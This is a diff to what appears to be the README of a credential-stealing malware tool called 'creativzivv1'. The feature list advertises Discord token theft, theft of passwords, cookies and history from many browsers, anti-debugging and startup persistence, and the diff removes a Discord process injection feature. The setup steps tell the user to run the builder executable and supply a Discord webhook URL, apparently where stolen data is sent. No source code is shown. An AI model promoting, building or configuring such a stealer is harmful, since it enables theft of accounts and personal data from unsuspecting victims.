@@ -1,7 +1,6 @@
 Features:                                                                                                                
 Discord token info                                                                    
-Browser stealing from 13 browsers (passwords, cookies, history, bookmarks, etc.)                                                                        
-Discord process injection                                                                                                                   
+Browser stealing from many browsers  (passwords, cookies, history, bookmarks, etc.)                                                                                                                                                                  
 Detailed system info                                                 
 Anti Debugging                                                                          
 Startup persistence                                                                                  
@@ -13,7 +12,7 @@ How to install:
  Download Latest Python        
 Run creativzivv1.exe       
 Insert your webhook url     
-Insert image url link      
+Insert image url link or just put an .   
 
 requirements: 
 a brain, windows 10+, python 3.9.5+, an discord server with an webhook
